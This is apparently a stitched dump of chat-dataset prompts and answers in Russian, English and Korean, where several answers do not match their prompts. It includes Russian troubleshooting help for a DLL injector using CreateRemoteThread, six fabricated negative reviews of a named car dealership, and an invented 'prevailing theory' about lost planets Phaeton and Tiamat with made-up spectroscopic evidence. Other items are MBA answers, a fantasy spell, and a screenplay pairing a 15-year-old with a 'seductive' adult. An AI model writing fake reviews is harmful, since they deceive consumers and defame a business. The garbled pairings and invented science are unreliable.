minutes **Spell Description**: \\"Breadth's Bane\\" is an advanced spell used to temporarily expand the space within a defined area, allowing for smooth passage in environments that would otherwise be too narrow or restrictive. This spell manipulates the fabric of the space itself to create a bubble-like extension of the area. It's commonly cast in doorways, corridors, and streets to accommodate the ample populations as they move through the city. The magical bubble shifts normal space, making room for all without altering the structure permanently. These spells reflect the unique challenges of a world where disproportionate body sizes are the norm. They are integral not only to the comfort and convenience of individuals but also to the stability and fluidity of society as a whole. Such spells are taught and used widely, ranging from personal enhancements to public utility incantations."},{"instruction":"Имеется DLL и cpp файл на языке C++.

Сообщение \\"DLL injected successfully!\\" появляется в консоли после того, как программа успешно инжектирует DLL в процесс. Рассмотрим несколько вероятных причин, по которым системное сообщение от \`MessageBox\` не отображается после успешной инъекции: 1. Процесс \\"CalculatorApp.exe\\" не найден или имя процесса в скрипте не соответствует реальному имени исполняемого файла калькулятора в вашей системе. Убедитесь, что имя процесса указано правильно. 2. Если вы используете 64-разрядный калькулятор в 64-разрядной системе, убедитесь, что ваша программа инжекции и DLL тоже скомпилированы для 64-разрядной архитектуры. Аналогично, для 32-разрядных процессов используйте 32-разрядные версии программы и DLL. 3. Возможно, антивирусное программное обеспечение или система безопасности Windows блокируют вашу попытку инжекции. 4. У вас есть ошибки в коде, например, неверный путь к DLL. Убедитесь, что строка \`const char* dllPath = \\"beep_boop_dll.dll\\";\` корректно указывает на расположение вашей DLL. 5. Учетная запись, под которой запускается приложение, может не иметь достаточных привилегий для выполнения инжекции в другие процессы. 6. Ошибка может быть в другом месте, которое не отражено в выводимом сообщении о успешной инжекции. Возможно, DLL загружается, но \`MessageBox\` не отображается по какой-то другой причине. Рекомендации для поиска и устранения ошибки: - Проверьте, что приложение запускается с административными привилегиями. - Проверьте журналы событий Windows на наличие ошибок связанных с вашим приложением или DLL. - Используйте отладчик, чтобы увидеть, вызывается ли \`DllMain\` и выполняется ли код внутри \`case DLL_PROCESS_ATTACH\`. - Убедитесь, что вы компилируете DLL и инжектор для одинаковой архитектуры (x86 или x64). - Убедитесь, что путь к DLL правильный и что он доступен для процесса, в который вы пытаетесь его инжектировать. Начните с проверки этих пунктов, чтобы выяснить и устранить проблему с отображением системного сообщения."},{"instruction":"Как с помощью отладчика проверить , вызывается ли DLLMain","output":"Чтобы проверить вызов \`DllMain\` с помощью отладчика, вы можете использовать Microsoft Visual Studio или любой другой отладчик, который поддерживает отладку Windows-приложений. Далее представлены шаги для проверки вызова \`DllMain\` с использованием Visual Studio: 1. Откройте проект вашей DLL в Visual Studio. 2. Установите точку останова (breakpoint) на первую строчку внутри функции \`DllMain\`: \`\`\`cpp BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { // Установите точку останова здесь switch (ul_reason_for_call) { ... } return TRUE; } \`\`\` 3. Скомпилируйте DLL в режиме отладки (выберите \\"Debug\\" вместо \\"Release\\"). 4. Запустите отладку программы-инжектора, которая загружает вашу DLL, также в Visual Studio, либо через проект этого приложения, либо присоединив отладчик к уже запущенному процессу инжектора. Если вы отлаживаете проект инжектора: - Откройте проект инжектора в Visual Studio. - Нажмите F5 или выберите \\"Start Debugging\\" из меню \\"Debug\\". Если вы присоединяетесь к уже запущенному процессу: - Запустите инжектор без отладки. - В Visual Studio выберите \\"Debug\\" > \\"Attach to Process\\" (или нажмите \`Ctrl + Alt + P\`). - Найдите и выберите процесс инжектора в списке и нажмите \\"Attach\\". 5. Выполните операцию инжекции DLL в целевой процесс. 6. Если все сделано правильно, и инжектирование происходит, отладчик должен остановиться на установленной точке останова в \`DllMain\`. Если точка останова не срабатывает: - Убедитесь, что DLL действительно пытается быть загруженным в целевой процесс. - Проверьте наличие ошибок в коде, из-за которых загрузка вашей DLL может не произойти. - Возможно, требуются дополнительные настройки, если целевой процесс имеет механизмы защиты, которые блокируют инжекцию. Важно: При работе с системными процессами или инжектировании DLL в процессы, которые могут затрагивать безопасность системы, следует проявлять осторожность, так как это может привести к непредвиденному поведению или угрозам безопасности."},{"instruction":"Проверь данный код на возможные ошибки, препятствующие загрузке DLL","output":"На первый взгляд, код в целом выглядит правильно для инжекции DLL в процесс, однако есть несколько вещей, которые стоит проверить: 1. Имя процесса: Убедитесь что имя процесса \`L\\"CalculatorApp.exe\\"\` правильно. Обратите внимание, что в Windows имя должно быть точным, с учётом регистра символов. 2. Путь к DLL: Убедитесь, что строка \`const char* dllPath = \\"beep_boop_dll.dll\\";\` указывает на верный путь к файлу DLL. Если DLL находится в другом каталоге, необходимо указать полный путь. 3. Разрядность: Убедитесь, что разрядность вашей DLL и целевого процесса совпадают. Например, если вы используете 64-разрядную систему и пытаетесь инжектировать 32-разрядную DLL в 64-разрядный процесс (или наоборот), это не сработает. 4. Доступ к процессу: \`OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);\` Для инжекции DLL может не требоваться \`PROCESS_ALL_ACCESS\`. Это может быть излишним и может быть не разрешено без повышения прав. Вы можете попробовать использовать более конкретные права доступа, необходимые для \`VirtualAllocEx\`, \`WriteProcessMemory\` и \`CreateRemoteThread\`. 5. Флаги безопасности Windows: Антивирусы и встроенные механизмы безопасности Windows могут предотвращать успешную инъекцию DLL в процесс. 6. Права администратора: Для инъекции DLL может потребоваться запуск вашего приложения с правами администратора. 7. Сообщение \`MessageBox\` с \`NULL\` в качестве \`HWND\`: \`MessageBox(NULL, L\\"БИП-БУП\\", L\\"Injected DLL\\", MB_OK);\` Это может не работать в зависимости от контекста процесса, в который вы инжектируете DLL. Также, если вы инжектируете в процесс, который не имеет GUI (например, службу), то это может не дать ожидаемого результата. 8. Обработчик ошибок: Добавьте обработчик ошибок в \`DllMain\` для \`DLL_PROCESS_ATTACH\`, который может дать вам больше информации, если что-то идет не так. Если после проверки всех этих пунктов проблема не решена, вам нужно использовать отладчик для более глубокого анализа того, что происходит внутри \`DllMain\` и процесса, в который вы пытаетесь инжектировать DLL."},{"instruction":"(In the main Azur Lane base...)

Regarding the inner asteroid belt, there is no evidence to suggest that two rocky planets were lost from it. The asteroids in this belt are primarily composed of rocky and metallic materials. As for the gas dwarf, it is unlikely that a gas giant or gas dwarf existed within the inner asteroid belt. Gas giants, like Jupiter and Saturn, are typically found in the outer regions of a solar system, where there is enough mass and colder temperatures to allow for the accumulation of large amounts of hydrogen and helium gas."},{"instruction":"Write idea text about lost two planets of inner asteroid belt of Solar system, inner asteroid belt was formed from collision of two planets: Rocky planet named Phaeton and gas dwarf named Tiamat.","output":"Title: The Enigmatic Tale of Lost Planets: Phaeton and Tiamat Introduction: In the vast expanse of the solar system lies a mysterious chapter wherein the inner asteroid belt emerged from the remnants of two lost planets. These celestial bodies, known as Phaeton and Tiamat, purportedly existed in the early stages of our solar system's formation. Although speculative, this tale serves to arouse curiosity and ignite the imagination in a quest to unravel the secrets behind these elusive cosmic entities. 1. The Rocky Planet Phaeton: Phaeton, a rocky planet, is theorized to have once orbited within the region between Mars and Jupiter, forming what is now called the inner asteroid belt. This planet may have shared similarities with familiar rocky planets such as Earth and Mars. The remnants of Phaeton, shattered by immense cosmic forces, now exist as the countless asteroids that constitute the asteroid belt. 2. The Enigmatic Gas Dwarf Tiamat: Alongside Phaeton lurked Tiamat, an enigmatic gas dwarf. This hypothetical celestial body, said to be located within the inner asteroid belt, would have possessed a substantial atmosphere composed mainly of hydrogen and helium. The remnants of Tiamat, too, have been dispersed throughout the asteroid belt, interspersed among the rocky debris from Phaeton's demise. 3. Cataclysmic Collision: The prevailing theory proposes that a cataclysmic collision occurred between Phaeton and Tiamat. The incredible force unleashed during this cosmic impact shattered the two planets, sending fragments hurtling through space. Among these fragments, asteroids of various sizes and compositions were born, creating the inner asteroid belt. 4. Clues from the Asteroids: Scientists have examined countless asteroids from the inner belt to gather information and pieces of this puzzle. Spectroscopic analyses reveal variations in composition and mineral content, suggesting the presence of remnants from both Phaeton and Tiamat. These findings, while still speculative, provide tantalizing hints supporting the notion of a catastrophic collision between these two lost planets. 5. The Enduring Mystery: Despite the theories and fragmentary evidence, the true nature of Phaeton, Tiamat, and their cataclysmic encounter remains an enduring mystery. The quest to uncover more concrete evidence and refine our understanding of the inner asteroid belt's origin continues to intrigue scientists and ignite the imaginations of astronomers and cosmologists alike. Conclusion: The lost planets of the inner asteroid belt, Phaeton and Tiamat, weave a captivating tale that fuels our curiosity about the early solar system's dynamics. While the existence of these celestial bodies is speculative, their hypothetical presence and subsequent collision serve as an invitation to explore the enigmas that lie within our cosmic neighborhood. As our knowledge advances, future discoveries may yet allow us to illuminate these lost celestial objects, shedding light on the captivating interplay of forces that shaped our solar system."},{"instruction":"(In the main Azur Lane base...)

Так как цена меня устраивала, провели тест-драйв, после чего я уже более конкретно определился с выбором машины. Прокатился, оценил все положительные стороны. В общем, автомобиль, безусловно мне понравился. Порадовало то, что менеджер терпеливо меня выслушал, при выборе учел мои пожелания, правильно направил, без навязывания какого-либо доп. оборудования, все четко и по делу. Я решил приобрести автомобиль здесь, в тот же день, так как тянуть уже было некуда, да и смысла не было. Цена, кстати, оказалась ниже ожидаемой, что порадовало. Покупкой в результате остался доволен. Могу рекомендовать салон «Прайм Авто»","output":"Отзыв #1: Ужасный опыт покупки машины в Атлант Моторс! Обещанные низкие цены – чистой воды обман. Когда заходишь, ценник расползается как на дрожжах! Менеджеры то ли не соображают, то ли просто зубы заговаривают покупателям. Чтоб добиться хоть какой-то ясности по машине – надо стать сыщиком. Сразу видно, они за качество не отвечают! Отзыв #2: Не советую никому покупать авто в Атлант Моторс! Менеджеры заморочили голову кучей ненужных деталей, а на деле - как дошло до покупки, так истинный цвет показали. Чуть что не так, они отворачиваются, как будто и не при делах. Никакой помощи по гарантии, только улыбаются зубами и всё. Отзыв #3: Полный облом с покупкой авто в Атлант Моторс! Все на словах гладко, а как дошло до сути – так одни огорчения. Менеджер видел во мне лишь кошелек, а не клиента. Машина на тест-драйве – одно удовольствие, а когда выехал из салона – начались проблемы. Оказалась куча скрытых дефектов, о которых умолчали! Отзыв #4: В Атлант Моторс надули как последнего лоха! Натянули цену, обещали кучу бонусов, а в итоге – ни скидок, ни приятных плюшек! Менеджер болтливый – при выборе обещал золотые горы, а в итоге стоимость авто выросла почти в полтора раза. Им только бы свое продать, а на сервисе уже и след простыл. Отзыв #5: Как можно было так проколоться с Атлант Моторс! Сначала всё казалось заманчиво – цены низкие, выбор ого-го! На деле подсунули машину, которая только в салоне и блестит. Выехал за ворота – и сразу куча неприятностей. До этого хвалили как лучшую покупку, а сам менеджер что? Всю ответственность отводит. Сервис никакой, одно разочарование. Отзыв #6: Донельзя разочарован \\"сервисом\\" в Атлант Моторс! Ожидал от профессионалов адекватной ценовой политики и порядочности, а получил кота в мешке. Менеджер, что встречал, всю душу выложил только до покупки. Потом как отрезало: молчание в ответ на вопросы, замечания по качеству авто игнорировали. Чувствую себя полностью обманутым."},{"instruction":"I found other asteroid belts are more common in zone of inner planets than zone of outer planets, Solar system's inner asteroid is in zone of inner planets.","output":"Yes, that is correct. Asteroid belts are more common in the zone of inner planets, which includes the rocky, terrestrial planets closer to the Sun like Mercury, Venus, Earth, and Mars. The main asteroid belt, located between Mars and Jupiter, is the most well-known example of an asteroid belt in the inner region of the Solar System. In contrast, the zone of outer planets, which includes gas giants like Jupiter and Saturn, usually have fewer asteroids. This is because the gravitational influence of these large planets can disrupt the formation and stability of asteroid belts in their vicinity. However, it's important to note that there are exceptions to this general pattern. For example, there are also smaller asteroid belts or groups of asteroids scattered throughout the outer regions of the Solar System, such as the Kuiper Belt and the Oort Cloud, which are beyond the orbit of Neptune. These regions contain a large number of icy bodies and comets in addition to asteroids."},{"instruction":"Other stars have own kuiper belts and oort clouds. I believe Kuiper belt could be made of red pancake-shaped asteroids like 'Oumuamua.","output":"It is true that other stars can have their own versions of Kuiper belts and Oort clouds. These regions are believed to be common in planetary systems throughout the universe, as they are thought to be remnants of the early stages of planet formation. The Kuiper Belt in our Solar System is a region beyond the orbit of Neptune that contains many small, icy bodies, including Pluto. While 'Oumuamua, the interstellar object that passed through our Solar System in 2017, is not believed to be from the Kuiper Belt, it is possible that similar pancake-shaped asteroids could exist in other Kuiper belts around other stars. However, it's important to note that our knowledge and understanding of other planetary systems is limited due to the difficulty of directly observing these distant objects. Much of what we know about exoplanets and their associated belts and clouds is based on models and indirect observations. Further scientific research, including future observations and studies, will be necessary to gather more information and better understand the nature and composition of Kuiper belts and Oort clouds around other stars."},{"instruction":"Explain the scope and functions of retailing. MBA","output":"Retailing encompasses all activities involved in selling goods or services directly to final consumers for personal, non-business use. It plays a critical role in the economy by providing consumers with a way to purchase goods and services, while simultaneously serving manufacturers and wholesalers as a means to reach the end user. Retailing isn’t just about physical stores but includes all channels through which goods are sold to consumers, including online, by mail, and via vending machines. The scope and functions of retailing can be broad, and an MBA-level understanding might include the following aspects: # Scope of Retailing: 1. **Consumer Focus**: Retailing is centered around meeting the needs and wants of consumers. It includes understanding consumer behavior and preferences to offer appropriate merchandise. 2. **Merchandising**: It involves selecting the right products or services to sell, choosing suppliers, managing inventory, and presenting products effectively within the retail space. 3. **Sales Channels**: Retail is not just about brick-and-mortar stores, it includes e-commerce websites, catalogues, teleshopping, pop-up stores, and more. 4. **Market Segmentation and Targeting**: Retailers often focus on specific market segments and tailor their offerings, pricing, and marketing accordingly. 5. **Value Addition Services**: Most retailers offer additional services beyond just selling products such as customer service, after-sales support, delivery services, and easy return policies. # Functions of Retailing: 1. **Sortation and Assortment**: Retailers collect an assortment of goods from various suppliers and manufacturers, sort them into appropriate categories, and make them available to consumers in a convenient way. 2. **Breaking Bulk**: Retailers buy in large quantities (wholesale) and sell in small quantities, suitable for consumer consumption. 3. **Hold Inventory**: Retailers maintain inventory, allowing consumers to purchase goods when they need them, providing immediate gratification and convenience. 4. **Value-added Services**: These could include anything from in-store experiences, extended warranties, loyalty programs, personal shopping assistants, and credit services. 5. **Customer Service and Satisfaction**: Ensuring good customer service, including advice, guidance, and post-purchase support, is essential in retailing. 6. **Marketplace for Producer Goods**: Retailers provide a platform for manufacturers to showcase and sell their products. They help in promoting brands and managing the product life cycle through strategies like discounts on slow-moving products. 7. **Marketing and Communication**: Retailers engage in marketing communication like advertising, sales promotions, and display to attract and retain customers. 8. **Facilitates Economy**: Retailers contribute to the economy by generating employment, contributing to GDP, and acting as a revenue source for governments through taxation. 9. **Trends and Feedback**: Retailers are in a unique position to gather consumer feedback and identify market trends. They can then communicate this information back to suppliers, aiding in product development and refinement. Retailing is a dynamic field, and an MBA curriculum would typically explore it in the context of strategic management, marketing, operations, supply chain management, consumer behavior, and retail analytics. Retail managers and executives must understand these principles to successfully navigate the competitive landscape, adapt to changing consumer behaviors, and leverage technology to enhance the retail experience."},{"instruction":"What is the main objective of retail management? MBA","output":"The main objective of retail management is to ensure that the retail business operates effectively and efficiently to maximize profits while delivering value and satisfaction to the customers. Below are the primary goals encompassed within the objective of retail management: 1. **Customer Satisfaction**: At the heart of retail management is the goal of fulfilling the needs and wants of customers, providing high-quality products and excellent service that ensure a positive shopping experience. 2. **Increase Sales**: Retail management aims to drive sales through various means such as effective merchandising, marketing, and sales promotions to ensure business profitability and growth. 3. **Inventory Management**: Efficient inventory management ensures that the right products are available at the right time and in the right quantities. This helps in minimizing costs, reducing stockouts, and avoiding overstock. 4. **Cost Control**: Managing expenses is essential to maintaining a profitable operation. Retail managers work to optimize operational costs without compromising the quality of goods or customer service. 5. **Enhancing Shopping Experience**: Creating an inviting and convenient shopping environment, both in physical stores and online, is imperative for attracting and retaining customers. 6. **Creating Loyalty**: Implementing loyalty programs and personalized services can help in retaining customers and increasing the frequency of their purchases. 7. **Retail Mix**: Making strategic decisions concerning the retail mix, which includes product, price, place, promotion, people, process, and physical evidence, is fundamental to retail management. 8. **Store Operations**: Smooth functioning of store operations - which includes store layout, staff management, checkout processes, and overall operational efficiency - ensures that customers have a seamless experience. 9. **Adapting to Market Trends**: Staying abreast of market trends and adapting business strategies accordingly, such as embracing e-commerce, omnichannel approaches, and sustainable practices. 10. **Competitive Advantage**: Developing a unique selling proposition (USP) to stand out among competitors and secure a strong market position is another critical objective. 11. **Compliance and Ethical Standards**: Ensuring that the retail operations are in compliance with legal regulations and ethical standards is also of paramount importance. In an MBA program, students would typically explore these objectives in depth and learn how to strategize, plan, and execute operations to meet these multifaceted goals effectively. They would also study best practices in retail management and understand how to leverage technology and data analytics for informed decision-making."},{"instruction":"Write a short note on Visual Merchandising. MBA answer","output":"Visual merchandising is an essential aspect of retail marketing that involves the aesthetic presentation of products and a store's atmosphere to enhance the customer experience and influence consumer behavior. It is a tool used to entice, engage, and motivate the customer towards making a purchase. The objective is to attract shoppers, provide a fulfilling shopping experience, and ultimately increase sales. **Key Elements of Visual Merchandising:** 1. **Window Displays**: These are the first visual touchpoint for a potential customer. Creative window displays aim to capture attention, reflect brand identity, and highlight key products or promotions. 2. **Store Layout**: The arrangement of aisles, fixtures, and displays within the store is designed to facilitate easy navigation and highlight products strategically, often directing customers through a predefined path that increases the likelihood of purchase. 3. **Product Placement**: This involves the strategic positioning of products to capture attention and promote certain items, often using planograms to maintain consistency and maximize shelf appeal. 4. **Lighting**: Lighting is used to set a store's mood, highlight products, and direct focus. It plays a critical role in how colors, textures, and features of products are perceived by customers. 5. **Signage and Graphics**: Effective signage provides information and guides customers through the store. Banners, price tags, and promotional signs help communicate offers and direct attention. 6. **Color and Décor**: The use of color can evoke emotions and set a tone. Décor helps establish an ambiance, supports the branding, and makes the shopping experience more pleasant. 7. **Interactive Elements**: Interactive displays or demonstrations can engage customers and create memorable experiences. This can also include digital screens that offer product information or entertainment. 8. **Mannequins and Forms**: These serve as silent salespersons, showcasing merchandise as it would appear on an actual person and providing styling ideas. 9. **Theme and Storytelling**: Creating a narrative through visual merchandising can be particularly powerful, as it helps customers to connect with the products on an emotional level. **Functions and Objectives:** 1. **Brand Reinforcement**: Visual merchandising communicates the brand’s personality and values to the consumer, reinforcing the brand image. 2. **Motivating Purchases**: By making products look appealing, visual merchandising stimulates customers' desire to purchase. 3. **Engaging the Senses**: Engaging as many senses as possible creates a rounded experience that can leave a lasting impression on shoppers, encouraging them to extend their stay in the store and return in the future. 4. **Maximizing Space and Sales**: The efficient use of space can make a retail environment look more inviting and can directly impact sales productivity per square foot. 5. **Information Communication**: It provides customers with essential information, often influencing their decision-making process in the store. From an MBA perspective, visual merchandising is recognized not just as an art but also as a strategic tool that involves understanding customer psychology, marketing principles, and retail analytics. It is an element of the broader retail strategy that requires collaboration between creative professionals (designers and visual merchandisers) and those with a firm grasp on operational management, budgeting, and data-driven decision-making. Effective visual merchandising can lead to increased customer satisfaction, loyalty, and sustained financial success for a retail business."},{"instruction":"What is KYC? Describe in detail. MBA perspective","output":"KYC, or \\"Know Your Customer,\\" is a critical process in the financial services industry that involves verifying the identity of clients and assessing their suitability, along with the potential risks of illegal intentions towards the business relationship. The KYC process serves as a foundational element for anti-money laundering (AML) measures, counter-terrorism financing (CTF) controls, and other regulatory compliance strategies. KYC is about understanding who the clients are and what kinds of transactions they are likely to conduct, thereby enabling companies to manage risks prudently. It involves various checks, including identity verification, understanding the nature of the customer's activities (to satisfy that the source of the customer's funds is legitimate), and the ongoing monitoring of existing customers to ensure that their transactions are consistent with the institution's knowledge of the customer's profile and the risk they represent. # Details of KYC: **1. Customer Identification Program (CIP):** - Every financial institution is required to have a CIP in place, per the regulations. It must collect and verify certain information from any new customer, such as name, address, date of birth, and an identification number (which can be an SSN for U.S. citizens or other government-issued documentation for non-U.S. persons). **2. Customer Due Diligence (CDD):** - This involves assessing the risk that the customer may be involved in any unlawful activities. It includes gathering additional information about the customer, understanding their transaction patterns, source of funds, the purpose of the account or relationship, and regular occupation or business of the client. - Enhanced Due Diligence (EDD) may be required for customers presenting a higher risk, such as politically exposed persons (PEPs) or those who transact in high-risk geographies. **3. Ongoing Monitoring and Reporting:** - Constant vigilance is necessary to ensure that customer activities remain consistent with the profile established during the CDD phase. Any anomalous transactions should be flagged and may need to be reported to the regulatory authorities. - Established thresholds for transactions and reporting suspicious activities help in mitigating the risks of money laundering and the financing of terrorism. **4. Record Keeping:** - Financial institutions are required to keep records of all identification information and transactions for a specified period. This will enable them to respond to any inquiries from regulatory bodies or law enforcement agencies. **5. Risk Management:** - Financial institutions should assess the risk profiles of all of their customers. They must then apply suitable risk management controls, depending on the level of risk associated with each customer. From an MBA perspective, KYC is not just a regulatory requirement but a strategic business practice that helps in protecting the financial system from fraud and ensuring institutional integrity. MBA students would study KYC within the context of business ethics, corporate governance, risk management, and compliance. These future managers and leaders are taught to appreciate the importance of KYC in mitigating financial risks, maintaining customer trust, and preventing their institution from becoming a vehicle for or victim of financial crimes. In an increasingly interconnected global economy, graduates with MBA specialties in Finance, Compliance, Risk Management, or Financial Crime are expected to grasp the complexities of KYC processes, including its technological, legal, and regulatory aspects. They may learn about KYC through case studies, regulatory updates, developing technologies for identity verification (such as biometrics and blockchain), compliance software, and the balance between customer experience and rigorous due diligence."},{"instruction":"1.

He is 15. That therapist has black hair and glasses. He wears a black business suit and red leather gloves. He has a smooth voice. He is seductive and bored. That therapist chats with people in their dreams and other stuff. In his interrogation room, he has a clipboard, a bottle and glass of rum and a pack of cigarettes alongside a ashtray.","output":"FADE IN: INT. DREAMSCAPE INTERROGATION ROOM - NIGHT The room is dimly lit, with smoky shadows playing against the walls. A large, ornate mirror reflects the haunting emptiness of this dreamlike space. In the center, a heavy, dark-wood table is set between two high-backed chairs. One is occupied by a YOUNG MAN, 15, gangly and awkward, shifting nervously in his seat. The tranquil stillness of the space is eerie yet comforting. Opposite him sits THE THERAPIST, a man in his late thirties, the picture of elegant detachment. His black hair is impeccably styled, his glasses perched on the bridge of his nose. His suit is sharp, and his red leather gloves add an unsettling pop of color against the monochrome backdrop. A clipboard rests on the table next to a mysterious bottle of rum, a single glass, and an open pack of cigarettes nestled beside an ashtray filled with the remnants of past consultations. THERAPIST (voice oozing seductive ennui) So... What brings you into the depths of your psyche tonight? Another bout of teenage angst, or have we progressed to existential dread? The Young Man swallows hard, visibly shaken yet entranced by the Therapist's smooth tone. YOUNG MAN I... I keep having this dream. The same one. And you're always here, like this isn't really my dream but some... some place you've brought me to. The Therapist languidly gestures with a gloved hand, inviting the boy to continue. THERAPIST Give details. Dreams are nothing but riddles wrapped in mystery inside your mind. Maybe, just maybe, you really want to unravel that conundrum. Or perhaps... He slowly pours the dark rum into the glass, the liquid cascading with a hypnotic swirl, but doesn't drink. THERAPIST (CONT'D) (leaning forward, a coy smile) ...You're just a visitor in my little parlor. Your fears and hopes laid bare on my table. Which one is it today? The Young Man hesitates, the sound of the ticking clock in the room now echoing in his ears. YOUNG MAN (stammering) I'm... lost. I can't find my way forward. School, friends – it's like I'm fading away. And nobody sees me. I'm invisible. The Therapist, unimpressed, lights a cigarette, the soft crackle of burning tobacco breaking the silence. He exhales a stream of smoke that hangs in the air like a specter. THERAPIST Invisibility. A common adolescent fear, metaphorically speaking, of course. But in this realm, you're anything but invisible. Here, under the luminous moon of your subconscious, you're the brightest star. He leans back, regarding the Young Man with a mixture of curiosity and disdain. THERAPIST (CONT'D) (softly) You're at a crossroads of identity, my young friend. A listless soul searching for essence in a waking world that feels devoid of meaning. Yet, in dreams, we often find our most vivid truths. The Young Man looks at the Therapist, longing for answers, for direction. His eyes are a mirror of vulnerability. YOUNG MAN I just... I want to be seen. I want to know I matter. The Therapist scribbles something on the clipboard, his gloves making a faint creaking noise. He finally looks up, his eyes piercing through the quiet desperation of the youth. THERAPIST (smiling enigmatically) Then you must open their eyes. But first, you have to open yours. Own this dreamscape, for it is yours alone – a place where shadows dance and hearts reveal themselves. You are not invisible here; you are illuminated.

''이로운 악’의 흐름이 좋아, 벌써 2관왕이고. 이슈적인 부분도 분명 평가에 포함됐을 거야. 가능성은 있어. 하지만 -역시 ‘에미상’은 전통이 길고 그만큼 변화를 싫어하지. 과연 어찌 될지.....' 이 시각 ‘에미상'의 생중계를 보는 세계 곳곳에선 기도가 가득했다. 특히, 한국이 그랬다. “제발! 제발!! 제발!!!\\" “우리 우진이가! 우진이가 불리길!” “오빠가 될 거야! 된다고! 돼야 해! 되죠!” 강우진의 가족들이나 홍혜연, 류정민 등등등 그를 아는 모든 이가 숨죽여 바랬다. “우진씨가 됐으면- 아니, 무조건 돼. 아우! 내가 왜 떨리냐구!” “조용히 좀 해! 다들 빌고 있는데 놀라잖냐!” 어쩌면. 아니, 100% 한국 전체가 염원하고 있었다. 저 외국인 여자 배우의 입에서 강우진의 이름이 불리기를 말이 다. 그때. -스윽. 생중계 속 여자 배우가 큐카드를 들면서도. \\"오우!\\" 빙긋 웃었다. “'에미상' 드라마 부문 남우주연상은-” 그리곤 무대가 떠나가라 이름을 외쳤다. “이로운 악!!! 강! 우! 진!!” 무대 위 두 여배우가 과하게 박수쳤다. \\"와우!!\\" “축하합니다!!” -♫♪ 음악이 터졌다. -짝짝짝짝짝짝짝짝!! 수만 명이 몰린 관객석에서 박수가 광광 울렸다. 반쯤은 일어나 강우진을 보며 박수쳤다. 기립박수는 ‘이로운 악’ 팀 역시 같았다. -짝짝짝짝짝짝짝짝짝!! 마일리 카라, 화린 외의 배우들이 기쁨의 웃음을 참지 못했다. “우진씨!! 우진씨!! 진짜 축하드려요!” “굉장해!!! 당신이 해냈어요!!” \\"우와!! 아니! 와- 우진씨 축하합니다!!\\" 턱수염 송만우 PD는 스륵 일어난 강우진을 얼싸안았고. “하하하! 그래!! 이거지!! 이렇게 돼야지!! 축하해요, 우진씨!!” 뒤에서 박수치는 최나나 작가는 눈가에 눈물이 맺혔다. ‘이로운 악’ 팀 전체가 방방 뛰었다. 그 주변의 관객들 역시 기립박수로 우진을 축하했다. 방송팀, 생중계 카메라가 축하받는 강우진을 메인으로 찍었다. \\".....\\" 네이비 턱시도의 강우진은 무던한 얼굴로. -스윽. 여배우들이 선 거대한 무대 쪽으로 걸었다. 자리가 가까워서 무대까지는 금방이었다. 어느새 무대 위로 오른 우진이 노란 드레스의 여배우에게 트로피를 받았다. 순간, 방송팀 카메라 중 한 개가 다른 후보 배우들을 찍었다. 무표정 으로 박수치는 민머리 매튜 메이저스. 억지의 분위기가 강했다. 그러거나 말거나 무대 위 강우진은. \\"......\\" 중앙 스텐딩 마이크 앞에 섰다. 웅웅 울리던 음악이 꺼졌다. 떠나가라 터지던 박수도 잦아들었다. 수만 관객이 그만을 응시했다. 우진이 한 손에 든 금빛 트로피를 내려봤다. 구 형태를 받드는 날개 달린 여자의 모습. 잠시간 트로피 를 무심히 내려보던 강우진이 고개를 들었다. 그리곤 수만 외국인 관객을 향해 입을 열었다. ‘에미상' 최초로 남우주연상을 탄, 금빛 트로피를 들어 올린 한국배우의 첫 마디였다. 물론, 영어였다. “이제 '아카데미상'만 남았습니다.” < 에미 (4) > 끝","output":"< Emmy (4) > Watching the back of bald-headed Matthew, Kang Woojin had a stern face but inwardly heaved a sigh of relief. 'What's with that guy? He's got quite the presence.' Then he turned his head towards the blonde-haired Kara. \\"Let's go.\\" Kara, with a slight smile mixed in, followed and opened her mouth. \\"Pretty bold, aren't you? Matthew has quite the influence around here, so I tend to avoid him too.\\" Oh, really? I didn't know that. Woojin had roughly thought that in Hollywood, Matthew's influence was on par with that of Seong Han-ho. Soon, Woojin, who was about to naturally respond with his concept act, changed his words. Since he had already confessed to her, he thought it might be okay to show a bit of his true self, little by little. Kang Woojin whispered to Kara. \\"To be honest, I was a bit scared.\\" \\"...Really?\\" \\"Yes.\\" \\"You didn't look it at all?\\" Kara, with her blue eyes, stared at Woojin and then her smile deepened. \\"Are you trying to reassure me? You don't have to. I'm not that close to Matthew anyway.\\" \\".....\\" Why does the ending jump out like that? Kang Woojin thought it would take a while for these huge misunderstandings and misconceptions to be resolved. At this point. \\"Oh! Mr. Kang Woojin!!\\" A man with a high-tension perm waved his hands vigorously at Woojin. He was about the same age as Kang Woojin. \\"Hahaha, I wanted to meet you!\\" \\"...Hello.\\" \\"Your red carpet performance was also the best! Let's be Insta friends!\\" Who are you? The man was vaguely familiar. Kara whispered the answer in his ear. \\"Billy Brown, you know him, but he's also a nominee like you.\\" A nominee for the Best Actor award, just like Matthew. However, the temperature difference in how they treated Woojin was stark. While Matthew was like a block of ice, this one was like a blazing fire. Afterwards, Kang Woojin had to encounter several actors. Especially, he met all the male lead actor nominees for the drama category. 'They're more friendly than I thought.' Except for Matthew and one other, the remaining two treated Kang Woojin quite warmly. Anyway. \\"Woojin! Miley! Over here!!\\" \\"Haha, Mr. Woojin. You've finally appeared as 'Jang Yeonwoo', right?\\" \\"I enjoyed your red carpet performance!\\" \\"Wow- Miley, your dress is really pretty, isn't it?\\" The 'Beneficial Evil' team greeted Kang Woojin and Kara, who had arrived at their seats, with great enthusiasm. Producer Song Manwoo, writer Choi Nana, Hwarin, and other actors, nominees for key staff, and Kim Sohyang, the general director, and other Netflix Korea employees were all dressed up in tuxedos, suits, and dresses. After a brief exchange of greetings, Hwarin, who was wearing a beige dress and had met her favorite after a long time, glanced at Kang Woojin, who was close to Kara, and furrowed her brow. Naturally, no one noticed. 'Why are they so close?' Hwarin, who had cleared her throat, whispered to Kang Woojin. Her fangirl fighting spirit was soaring. \\"Mr. Woojin, it feels like it's been a long time. But what was that on the red carpet?\\" \\"You'll know when you see the movie later.\\" Seeing this, Miley Kara also smiled nonchalantly, but inside she was constantly bothered by Hwarin. '...That actress, she's the one- Kang Woojin saved her first. What, she's too cute? And yet subtly sexy.' Somehow, the entire 'Beneficial Evil' team had gathered. Their seats were a bit in front of the center, facing the stage. A foreigner who seemed to be a producer from the broadcasting team pointed at the 'Beneficial Evil' team with his index finger. \\"Start with them for the angle.\\" Several cameras captured the 'Beneficial Evil' team. The live broadcast team did the same. After all, 